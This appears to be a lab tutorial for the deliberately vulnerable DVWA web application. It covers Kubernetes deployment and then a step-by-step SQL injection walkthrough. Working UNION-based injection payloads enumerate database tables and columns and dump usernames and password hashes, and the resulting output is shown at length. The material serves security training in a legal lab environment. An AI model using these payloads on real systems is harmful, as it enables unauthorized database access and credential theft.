# Damn Vulnerable Web Application (DVWA)

## Overview

Damn Vulnerable Web Application (DVWA) is a PHP/MariaDB web application that is
damn vulnerable. Its main goal is to be an aid for security professionals to
test their skills and tools in a legal environment, help web developers better
understand the processes of securing web applications and to aid both students
and teachers to learn about web application security in a controlled class room
environment.

```
k apply -f code/dvwa/dvwa.kubernetes.yaml
```

```
k port-forward -n dvwa svc/dvwa-app 8888:8888
```

Navigate to <http://localhost:8888> and login as `admin:password`.

## Vulnerability: SQL Injection

Enter `1` in the filed and press ENTER. A red error text pop-up should appear
with the following text:

```
ID: 1
First name: admin
Surname: admin
```

This error already indicates that the application is vulnerable: instead of
displaying User Not Found or a similar message, it shows the first and last name
of the user with the ID of 1.

Let's see if we can find more users. Enter the following into the User ID field
and press ENTER:

```
sparklekitten' or '1'='1
```

By entering this input, you should get the following output:

```
ID: sparklekitten' or '1'='1
First name: admin
Surname: admin
ID: sparklekitten' or '1'='1
First name: Gordon
Surname: Brown
ID: sparklekitten' or '1'='1
First name: Hack
Surname: Me
ID: sparklekitten' or '1'='1
First name: Pablo
Surname: Picasso
ID: sparklekitten' or '1'='1
First name: Bob
Surname: Smith
```

Let's find all the names of the tables in the database.

```
sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
```

You should get a long list of names, most of which are standard tables created
for running the SQL database. In the following output, only the two at the top
are important for our purposes: `guestbook` and `users`.

``` hl_lines="240 243"
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: ALL_PLUGINS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: APPLICABLE_ROLES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: CHARACTER_SETS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: CHECK_CONSTRAINTS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: COLLATIONS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: COLLATION_CHARACTER_SET_APPLICABILITY
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: COLUMNS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: COLUMN_PRIVILEGES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: ENABLED_ROLES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: ENGINES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: EVENTS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: FILES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: GLOBAL_STATUS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: GLOBAL_VARIABLES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: KEYWORDS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: KEY_CACHES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: KEY_COLUMN_USAGE
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: OPTIMIZER_TRACE
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: PARAMETERS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: PARTITIONS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: PLUGINS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: PROCESSLIST
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: PROFILING
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: REFERENTIAL_CONSTRAINTS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: ROUTINES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: SCHEMATA
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: SCHEMA_PRIVILEGES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: SESSION_STATUS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: SESSION_VARIABLES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: STATISTICS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: SQL_FUNCTIONS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: SYSTEM_VARIABLES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: TABLES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: TABLESPACES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: TABLE_CONSTRAINTS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: TABLE_PRIVILEGES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: TRIGGERS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: USER_PRIVILEGES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: VIEWS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: CLIENT_STATISTICS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INDEX_STATISTICS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_FT_CONFIG
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: GEOMETRY_COLUMNS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_SYS_TABLESTATS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: SPATIAL_REF_SYS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: USER_STATISTICS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_TRX
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_CMP_PER_INDEX
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_METRICS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_FT_DELETED
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_CMP
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: THREAD_POOL_WAITS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_CMP_RESET
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: THREAD_POOL_QUEUES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: TABLE_STATISTICS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_SYS_FIELDS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_BUFFER_PAGE_LRU
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_LOCKS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_FT_INDEX_TABLE
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_CMPMEM
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: THREAD_POOL_GROUPS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_CMP_PER_INDEX_RESET
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_SYS_FOREIGN_COLS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_FT_INDEX_CACHE
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_BUFFER_POOL_STATS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_FT_BEING_DELETED
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_SYS_FOREIGN
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_CMPMEM_RESET
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_FT_DEFAULT_STOPWORD
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_SYS_TABLES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_SYS_COLUMNS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_SYS_TABLESPACES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_SYS_INDEXES
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_BUFFER_PAGE
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_SYS_VIRTUAL
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: user_variables
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_TABLESPACES_ENCRYPTION
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: INNODB_LOCK_WAITS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: THREAD_POOL_STATS
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: guestbook
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: users
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: access_log
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: security_log
ID: sparklekitten' and 1=0 union select null, table_name from information_schema.tables #
First name: 
Surname: session_account_connect_attrs
```

Now that we know the table name for users, we can query it for more information:

```
sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
```

This line asks for all column names in the `users` table. The `concat` command
asks for the table name and column name from any table named `users`. The `0x0a`
syntax represents a newline so the table name and column name are printed
separately, making them easier to read. The output should contain several lines
showing the names of the columns in the table:

``` hl_lines="4 8 12 16 20 24 28 32 36 40"
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
user_id
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
first_name
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
last_name
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
user
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
password
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
avatar
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
last_login
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
failed_login
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
role
ID: sparklekitten' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
First name: 
Surname: users
account_enabled
```

``` mermaid
erDiagram
    users {
        string user_id
        string first_name
        string last_name
        string user
        string password
        string avatar
        string last_login
        string failed_login
        string role
        string account_enabled
    }
```

Use the following query to see what the database stores in the password field:

```
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```

```
ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: admin
admin
admin
5f4dcc3b5aa765d61d8327deb882cf99
ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: Gordon
Brown
gordonb
e99a18c428cb38d5f260853678922e03
ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: Hack
Me
1337
8d3533d75ae2c3966d7e0d4fcc69216b
ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: Pablo
Picasso
pablo
0d107d09f5bbe40cade3de5c71e9e9b7
ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: Bob
Smith
smithy
5f4dcc3b5aa765d61d8327deb882cf99
```

* <https://bobby-tables.com/>

## Cleanup

```
k delete -f code/dvwa/dvwa.kubernetes.yaml
```

## Build a Custom Docker Container Image

```
git clone git@github.com:digininja/DVWA.git
cd DVWA
```

``` diff
-FROM docker.io/library/php:8-apache
+FROM docker.io/library/php:8.3-apache
```

```
docker buildx build -t ghcr.io/digininja/dvwa:8.3-apache .
```

```
docker image save -o /tmp/dvwa.tar ghcr.io/digininja/dvwa:8.3-apache
sudo ctr -n k8s.io image import /tmp/dvwa.tar && rm /tmp/dvwa.tar
```

## Further Reading

* <https://github.com/digininja/DVWA>
* <https://medium.com/@sonalipriyankasamantaray/penetration-testing-with-dvwa-damn-vulnerable-web-application-e61f5ac9cb24>
* <https://www.youtube.com/watch?v=WkyDxNJkgQ4>
* <https://owasp.org/www-project-vulnerable-web-applications-directory/>
* <https://hub.docker.com/r/vulnerables/web-dvwa>
